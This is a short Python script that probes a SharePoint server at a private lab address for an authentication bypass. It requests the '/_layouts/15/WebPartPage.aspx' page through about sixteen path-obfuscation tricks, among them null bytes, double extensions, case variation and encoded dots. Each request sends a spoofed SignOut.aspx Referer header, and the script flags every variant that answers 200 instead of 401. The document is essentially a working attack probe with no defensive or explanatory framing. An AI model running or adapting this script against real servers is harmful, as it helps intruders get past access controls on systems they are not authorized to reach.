import requests

base_url = "http://10.10.10.166"
# Use WebPartPage as base
endpoint_tests = [
    ("Double extension", "/_layouts/15/WebPartPage.aspx.aspx"),
    ("URL encoded aspx", "/_layouts/15/WebPartPage%2Easpx"),
    ("Case variation", "/_layouts/15/webpartpage.ASPX"),
    ("Mixed case", "/_layouts/15/WebPartPaGe.AsPx"),
    ("Null byte (Python)", "/_layouts/15/WebPartPage.aspx%00"),
    ("Null byte (raw)", "/_layouts/15/WebPartPage.aspx\x00"),
    ("Trailing dot", "/_layouts/15/WebPartPage.aspx."),
    ("Double dot before ext", "/_layouts/15/WebPartPage..aspx"),
    ("Space before ext", "/_layouts/15/WebPartPage .aspx"),
    ("Plus sign", "/_layouts/15/WebPartPage+.aspx"),
    ("Unicode normalization", "/_layouts/15/WebPartPage.aspx"),
    ("IIS asterisk wildcard", "/_layouts/15/*.aspx"),
    ("Path info append", "/_layouts/15/WebPartPage.aspx/test"),
    ("Query delimiter only", "/_layouts/15/WebPartPage.aspx?"),
    ("Multiple query markers", "/_layouts/15/WebPartPage.aspx??test"),
    ("Semicolon delimiter", "/_layouts/15/WebPartPage.aspx;test=1"),
]

for name, path in endpoint_tests:
    headers = {"User-Agent": "Mozilla/5.0", "Referer": "/_layouts/SignOut.aspx"}
    try:
        resp = requests.get(base_url + path, headers=headers, timeout=10)
        if resp.status_code == 200:
            print(f"✓ [{name}] Status: {resp.status_code} - WORKS")
        elif resp.status_code == 401:
            print(f"✗ [{name}] Status: {resp.status_code}")
        else:
            print(f"? [{name}] Status: {resp.status_code}")
    except Exception as e:
        print(f"✗ [{name}] Error: {str(e)[:40]}")
